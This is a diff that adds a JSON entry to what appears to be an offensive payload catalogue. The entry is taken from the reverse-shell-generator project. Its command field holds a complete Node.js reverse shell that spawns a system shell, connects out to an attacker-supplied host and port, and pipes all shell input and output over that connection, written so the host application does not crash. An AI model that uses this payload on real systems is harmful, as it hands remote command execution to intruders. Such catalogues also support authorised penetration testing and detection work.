@@ -1,0 +1,30 @@
+{
+  "id": "rsg-reverseshell-node-js-2",
+  "name": "RSG · ReverseShell · node.js #2",
+  "command": "(function(){\r\n    var net = require(\"net\"),\r\n        cp = require(\"child_process\"),\r\n        sh = cp.spawn(\"<shell>\", []);\r\n    var client = new net.Socket();\r\n    client.connect(<lport>, \"<lhost>\", function(){\r\n        client.pipe(sh.stdin);\r\n        sh.stdout.pipe(client);\r\n        sh.stderr.pipe(client);\r\n    });\r\n    return /a/; // Prevents the Node.js application from crashing\r\n})();",
+  "description": "Reverse Shell payload — node.js #2 (via reverse-shell-generator).",
+  "platform": "cross-platform",
+  "tags": [
+    "rsg",
+    "payload",
+    "reverse-shell",
+    "linux",
+    "mac",
+    "windows"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "ReverseShell/node.js #2/56",
+  "category": "payloads",
+  "subcategory": "reverse-shell",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
